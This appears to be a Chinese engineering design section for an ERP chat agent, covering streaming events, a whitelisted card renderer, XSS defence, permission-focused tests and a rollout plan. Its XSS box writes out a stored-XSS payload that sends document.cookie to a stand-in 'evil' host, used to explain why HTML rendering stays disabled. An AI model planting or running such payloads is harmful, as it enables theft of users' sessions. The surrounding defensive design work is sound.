+<pre><code>event: meta        {"session_id": "...", "model": "deepseek-chat"}
+event: tool_start  {"name": "list_purchase_overdue", "label": "采购到期未到货"}
+event: tool_end    {"name": "list_purchase_overdue", "rows": 20, "ms": 340}
+event: delta       {"text": "到期未到货共 "}
+event: card        {"type": "po_urge", "card_id": "...", "title": "...",
+                    "facts": {...}, "note": "...", "expires_at": "..."}
+event: done        {"sources": [...], "suggestions": [...], "usage": {...}}
+event: error       {"message": "...", "fallback": true}
+</code></pre>
+
+<ul>
+<li><b><code>tool_start</code> / <code>tool_end</code> 不是装饰。</b>现状前端只有三点动画（<code>AgentView.vue:242-249</code>），30 秒里用户完全不知道发生了什么。把"正在查采购到期未到货…"打出来，等待感和信任感都不一样——而且这些事件本身就是<b>给用户看的数据来源审计</b>，比事后在气泡下面挂一行小字（<code>:227-230</code>）更有说服力。</li>
+<li><b><code>card</code> 的 payload 完全由服务端构造</b>，不来自模型输出流。模型只决定"要出一张什么<b>类型</b>的卡"（第三章原则③：能力可枚举），<code>facts</code> 由服务端在发事件前<b>现查</b>业务接口填入。这是原则②"事实源在服务端"落到传输层的样子。</li>
+<li><b>降级也走 <code>error</code> 事件</b>，不要走 HTTP 状态码。现状降级是在一个宽泛 except 里完成的（<code>agent_router.py:957</code>），用户只看到一个"规则模式"标签；改成事件后，前端可以明确显示"大模型暂时不可用，已切换到规则模式"，并把原因（<code>_fallback_reason</code>，<code>:895</code> 已经算好了 timeout / http-500 之类）一并带出。</li>
+</ul>
+
+<h4>卡片渲染器：白名单在前端可信代码里</h4>
+
+<pre><code>// 类型 → 组件：白名单，写死在前端源码里
+const CARD_COMPONENTS = { po_urge: PoUrgeCard, balance_remind: BalanceCard }
+// 类型 → 端点：同样写死。端点字符串永远不出现在模型输出里
+const CARD_ENDPOINTS  = {
+  po_urge: (id) =&gt; `/api/purchase-mgmt/items/${id}/urge`,
+}
+</code></pre>
+
+<p>未知 <code>type</code> 一律渲染成"不支持的卡片类型（请升级客户端）"，<b>绝不 fallback 到"把 payload 当 HTML 渲染"</b>。这一条要写进代码注释，因为它在赶工期时是最容易被"临时放开一下"的地方。</p>
+
+<p><b>facts 与 note 的视觉分离</b>：<code>facts</code>（服务端权威事实：单号、供应商、超期天数、金额）用表格 + 正文色；<code>note</code>（模型写的一两句建议）用灰字 + 「AI 建议」标签，并且<b>永远排在 facts 下面</b>。这不是审美问题，是<b>责任划分</b>——出了错，用户能一眼看出哪部分是系统查的、哪部分是模型说的。这一点在向业务方演示时，比任何"我们做了权限控制"的口头保证都管用。</p>
+
+<p><b>确认前二次拉取权威事实</b>：点「确认」时先 GET 一次权威数据，与卡片生成时的快照比对；不一致则不提交，原地刷新并提示"数据已变化，请复核"。卡片可能在屏幕上躺了十分钟，期间货已经到了、款已经收了。这个系统的逾期扫描器本身就有"业务时间 &lt; 15:00 跳过"这类时间敏感特判（<code>overdue.py:317-321</code>，理由是货车中午才发车、早上提醒多为误报），说明业务方对"什么时候算逾期"极其敏感，陈旧提案会直接损伤信任。</p>
+
+<p><b>令牌过期</b>：卡片带服务端签发的短时效 token（如 15 分钟），过期后按钮置灰。但要说清楚——<b>这不是安全边界</b>。真正的边界是"请求用人自己的 token 打现有业务端点、后端照常鉴权"（第三章原则一与原则三）；令牌只防陈旧提案被误点，属于体验保护，不要当防线来宣传。</p>
+
+<h4>XSS：为什么不能放开 markdown-it 的 html:false</h4>
+
+<div class="box red">
+<b class="t">这条链路上唯一的防线</b>
+<p><code>AgentView.vue:21</code> 的 <code>new MarkdownIt({ html: false, linkify: true, breaks: true })</code> 配 <code>:224</code> 的 <code>v-html="renderMd(m.content)"</code>。<code>html:false</code> 让 markdown-it 把原始 HTML 转义成实体——这是整条链路上<b>唯一</b>的 XSS 防线，没有 DOMPurify、没有 CSP 兜底。</p>
+<p>攻击链非常具体：工具返回值里的 <code>item_name</code> / <code>supplier</code> / <code>customer</code> / <code>project_name</code> 全部来自业务表，<b>任何有采购录入权限的人</b>都能把某个物料名称填成 <code>&lt;img src=x onerror="fetch('//evil/?c='+document.cookie)"&gt;</code>；模型会老老实实把它抄进 markdown 表格的一格；如果 <code>html:true</code>，别人只要问一句"采购未到货"，就在<b>自己的</b>浏览器里执行了这段脚本。</p>
+<p>注入点（采购录入）和触发点（另一个人问一句话）完全分离，触发者是无辜第三人——这是教科书式的存储型 XSS，只是中间多了个模型当搬运工。而且这个系统是 Electron 桌面客户端，渲染进程拿到的能力比浏览器标签页更多。</p>
+<p><b>规矩：<code>html</code> 永远 <code>false</code>。</b>将来若需要富文本（比如带样式的对比块），走卡片组件，不走 markdown；卡片 payload 用 <code>{{ }}</code> 插值（Vue 默认转义），不用 <code>v-html</code>。</p>
+</div>
+
+<h3>6.7　测试策略：Agent 怎么测</h3>
+
+<h4>本项目测试约定</h4>
+
+<p><code>AGENTS.md:21</code> 写得很清楚：<code>cd backend &amp;&amp; .venv/bin/python tests/&lt;name&gt;.py</code>——<b>独立 asyncio 脚本 + 临时 SQLite，不是 pytest</b>。每个脚本自己 <code>mkdtemp()</code>、设 <code>DATABASE_URL</code>、<code>create_all</code>、<code>seed</code>、用 <code>httpx.ASGITransport</code> 打进程内 app，最后 <code>sys.exit(1 if FAIL else 0)</code>。系统 <code>python3</code> 是 3.9，缺 aiosqlite 会直接炸，<b>必须</b>用 <code>backend/.venv/bin/python</code>（3.12）。已有的 <code>backend/tests/test_agent_perms.py</code>、<code>test_agent_chat.py</code>、<code>test_agent_chat_logs.py</code> 就是这个形态，照抄即可。</p>
+
+<h4>① 权限断言测试（最重要）</h4>
+
+<p><b>同一个问题、不同身份问、断言返回的行与字段跟页面一致</b>。这是 Agent 唯一真正必须测的东西——模型答得漂不漂亮无所谓，多给一个人看到一行不该看的数据就是事故。</p>
+
+<p>已有的 <code>test_agent_perms.py</code>（160 行）断言的是<b>域级</b>门控（有没有 <code>purchase_mgmt</code> 菜单）。L3 之前必须补的是<b>行级</b>断言：</p>
+
+<div class="scroll"><table>
+<tr><th>用例</th><th>造数</th><th>断言</th><th>对齐的页面口径</th></tr>
+<tr><td>采购按 buyer_id</td><td>建两个 buyer：一个纯 <code>buyer</code>，一个 <code>buyer+finance+logistics</code>（王芹型）；各造若干采购明细</td><td>问"采购未到货"，各自只看到 <code>buyer_id==自己</code> 的行；<b>兼任 finance/logistics 不解除隔离</b></td><td><code>purchase_mgmt_router.py:46</code> <code>_buyer_restricted</code>、<code>:349</code></td></tr>
+<tr><td>销售按 sales_uid</td><td>建 <code>sales</code> 与 <code>sales_lead</code>，各挂台账</td><td>问"尾款"，<code>sales</code> 只看到自己的；<code>sales_lead</code> 看到全部</td><td><code>sales_router.py:53</code> <code>_all_view</code>、<code>:239</code></td></tr>
+<tr><td>任务按 worker_id</td><td>两个 designer 各领任务</td><td>问"逾期任务"，只看到自己的</td><td><code>orders_router.py:317</code></td></tr>
+<tr><td>项目详情按成员</td><td>非项目成员的普通账号</td><td>问"XXXX 进度"→「无权查看该项目」，<b>且不泄露项目是否存在</b></td><td><code>deps.py:125</code> <code>user_can_view_project</code>（<code>agent_router.py:255</code> 已在用）</td></tr>
+</table></div>
+
+<div class="box green">
+<b class="t">断言写法：集合包含，而不是写死行数</b>
+<p>不要断言"返回 3 行"。断言 <b>Agent 返回的项目编号集合 ⊆ 用同一个 token 调页面接口返回的集合</b>。这样页面口径变了（业务经常变），测试自动跟随，不会出现"两边各写一份口径、改了一边忘了另一边"——而这恰恰是这个 Agent 最初出问题的根因。</p>
+</div>
+
+<h4>② 工具单测（脱离 LLM）</h4>
+
+<p>直接 <code>await agent_router.tool_xxx(db, current)</code>。这一层<b>已经有了</b>：<code>test_agent_chat.py:277-308</code> 就是直接调 6 个工具函数，不经过任何模型。新工具照抄这个形态即可——成本极低、跑得极快、能覆盖口径 bug。</p>
+
+<p>6.2 里那个 <code>po_overdue_by_supplier</code> 的双口径 bug，<b>一条断言就能锁死</b>：造 25 条同供应商逾期，断言 <code>sum(每家 count) == item_total</code>。这条断言现在跑就会红。</p>
+
+<h4>③ 规则降级路径测试</h4>
+
+<p><code>test_agent_chat.py:17</code> 的 <code>os.environ.pop("AGENT_LLM_API_KEY", None)</code> 强制走关键词匹配路径。这条测试的价值被低估了——它是<b>唯一不依赖外部服务、能在 CI 里稳定跑的端到端路径</b>，实际上把"权限门控 + 工具口径 + 格式化"三层一起验了。</p>
+
+<p>L3 之后要补一条新断言：<b>规则路径不生成卡片</b>。理由是规则路径没有"判断"能力，只有关键词匹配，让它出提案卡片等于让 <code>if "尾款" in msg</code> 去决定要不要催客户付款。断言响应里不含 <code>card</code> 事件，把这条钉死。</p>
+
+<h4>④ 卡片契约测试</h4>
+
+<p>核心断言：<b><code>facts</code> 必须来自服务端重查，而不是卡片快照</b>。两条用例：</p>
+<ul>
+<li>生成一张卡片 → 直接改库里的源数据（比如把 <code>expected_arrival</code> 往后推）→ 调"确认前校验"接口 → 断言返回 <code>stale=true</code> 且拒绝提交。</li>
+<li>把卡片 payload 里的端点和金额都篡改后提交 → 断言后端不认。因为端点由类型在可信前端代码里决定、金额由服务端重查，篡改<b>结构上</b>无效——这条测试是在验证"能力可枚举"这个设计真的落地了，而不是只写在文档里。</li>
+</ul>
+
+<h4>不测什么，也要写清楚</h4>
+
+<div class="box amber">
+<b class="t">不要把「模型是否选对了工具」写成单测</b>
+<p>那是评测（eval），不是单测：波动大、依赖外部服务、失败了也不该阻塞发版。要做的话单独放 <code>backend/evals/</code>，人工触发，用固定 20 条问题跑通过率，作为改 prompt 时的<b>参考</b>，不进 CI。把评测和单测混在一起，结果是 CI 时红时绿，两周后所有人开始无视 CI——这比没有测试更糟。</p>
+</div>
+
+<h3>6.8　可迁移方法论</h3>
+
+<h4>先分清哪些换个客户就要重做</h4>
+
+<div class="scroll"><table>
+<tr><th>只属于本项目</th><th>换个客户会变成什么</th></tr>
+<tr><td>菜单门控（<code>menus.py:142</code> <code>user_menu_keys</code>，按账号配置、角色矩阵已废除）</td><td>可能是 RBAC 角色树、可能是组织架构树、可能是 ABAC 策略引擎。<b>唯一不变的是「有一个地方定义了谁能看什么」，你的任务是找到它并复用，而不是重新发明</b></td></tr>
+<tr><td>七类行级可见性规则（buyer_id / sales_uid / owner_uid / 派单 / ProjectMember / worker_id / OA 四路）</td><td>数量和形态全变，但"页面已经实现过一遍、Agent 必须继承而不是重写"这个结论不变</td></tr>
+<tr><td>Top-20 ↔ <code>export_requests</code> 审批闸门的对应关系</td><td>换成"这个系统的批量导出卡在哪"——有的客户卡在下载水印，有的卡在 DLP，有的根本没卡</td></tr>
+<tr><td>复用 <code>reports_router</code> 的口径（资金面板 / 13 周现金流 / 项目毛利榜）</td><td>换成"这个系统里哪些数字已经被业务签过字"。找到它、调它，别自己算</td></tr>
+</table></div>
+
+<h4>可以原样抄走的规范模板</h4>
+
+<div class="box blue">
+<b class="t">工具七条（可直接贴进新项目的 CONTRIBUTING / AGENTS.md）</b>
+<ol>
+<li>命名 <code>动词_域_对象</code>；产生提案的工具一律 <code>propose_</code> 前缀，且只生成待确认卡片</li>
+<li>description 必须包含<b>什么时候该调</b>与<b>不该调时改调谁</b>，不是只写功能</li>
+<li>参数只留模型真正需要决定的；身份、租户、部门一律由框架注入，不进 schema</li>
+<li>返回 4-6 个字段、硬上限 N 行（N 由该系统的批量导出闸门倒推，不是拍脑袋）</li>
+<li>一个工具一件事；聚合工具自己跑聚合，<b>禁止在别的工具的截断结果上二次加工</b></li>
+<li>错误返回 <code>{"error": 人话}</code> 回灌给模型转述，不抛异常</li>
+<li>七不准：不写 SQL、不自建会话、不判角色、不返回自由 JSON 列、不返回黑名单字段、不做写操作、不接收权限参数</li>
+</ol>
+</div>
+
+<div class="box blue">
+<b class="t">registry 三条</b>
+<ol>
+<li><b>一处定义</b>：name / label / domain / when / 参数 / followups / top_n，其余全部由它生成</li>
+<li><b>schema 自动生成且顺序稳定</b>：注入参数走白名单跳过；缺描述、类型不支持一律<b>注册时抛异常</b>（启动即失败，好过线上才发现）；按名排序 + <code>sort_keys=True</code></li>
+<li><b>前端标签从接口拉，不硬编码</b>：客户端版本会长期滞后，硬编码的标签会长期错位</li>
+</ol>
+</div>
+
+<div class="box blue">
+<b class="t">缓存三条</b>
+<ol>
+<li>稳定内容（规则、格式要求）<b>放最前</b></li>
+<li>身份、角色、日期<b>放最后</b>（system 末尾之后，或首条 user 消息里）</li>
+<li>工具列表<b>全量下发且有序</b>；按用户裁剪省的是零头，毁的是全部缓存</li>
+</ol>
+</div>
+
+<div class="box green">
+<b class="t">上线前必须有的四个数字</b>
+<p>单问输入 token、单问输出 token、缓存命中率、月度成本。<b>没有这四个数字的 Agent 项目，成本失控只是时间问题</b>——而且失控时你连"到底是哪个环节涨的"都答不上来。这四个数字全部可以从模型响应的 <code>usage</code> 字段直接得到，不需要任何额外基建；本项目现在已经拿到了这个字段，只是丢掉了（<code>agent_router.py:502</code> → <code>:524</code>）。</p>
+</div>
+
+<h4>落地顺序（对现场交付尤其重要）</h4>
+
+<div class="scroll"><table>
+<tr><th>顺序</th><th>做什么</th><th>工作量</th><th>为什么排这个位置</th></tr>
+<tr><td>0</td><td><b>改 prompt 结构，把身份和日期后置</b></td><td>半天</td><td><span class="tag now">先做</span>不改任何业务语义、出不了事故，一周后就能拿出一张真实的成本对比图。<b>现场交付第一周最需要的就是可量化的成果</b></td></tr>
+<tr><td>1</td><td>registry + guard 骨架</td><td>1 天</td><td>后面每个工具都建立在它上面，越晚做迁移成本越高</td></tr>
+<tr><td>2</td><td>迁移现有 7 个工具（改成调 router + 传 current）</td><td>0.5 天/个</td><td>这一步同时修掉线上的行级越权 P0，优先级由风险决定而不是由计划决定</td></tr>
+<tr><td>3</td><td>补权限断言测试</td><td>1 天</td><td>紧跟第 2 步，趁口径还在脑子里</td></tr>
+<tr><td>4</td><td>会话表 + 按 token 截断</td><td>1 天</td><td>这时才有真实 token 数据支撑参数选择</td></tr>
+<tr><td>5</td><td>SSE 流式</td><td>1 天</td><td>体验提升，无风险</td></tr>
+<tr><td>6</td><td>卡片（L3）</td><td>按卡片类型逐个上</td><td><span class="tag new">最后</span>必须建立在前面全部完成之上；<b>先上一种卡片跑两周再上第二种</b></td></tr>
+</table></div>
+
+<p>这个顺序里最反直觉的是把「改 prompt 结构」排在第 0 位——它既不是最重要的（第 2 步的越权才是），也不是最难的。排在最前的理由是<b>交付节奏</b>：它零风险、一周出数、能直接向客户证明"这个人动手之后确实有变化"。P0 越权修复反而不适合放第一周，因为它需要先有 registry 和测试兜底，草率动手容易在修一个洞的同时开另一个。<b>技术优先级和交付优先级不是一回事，两者都要照顾——这大概是 FDE 与纯后端工程师最大的思维差别。</b></p>
+
+</section>
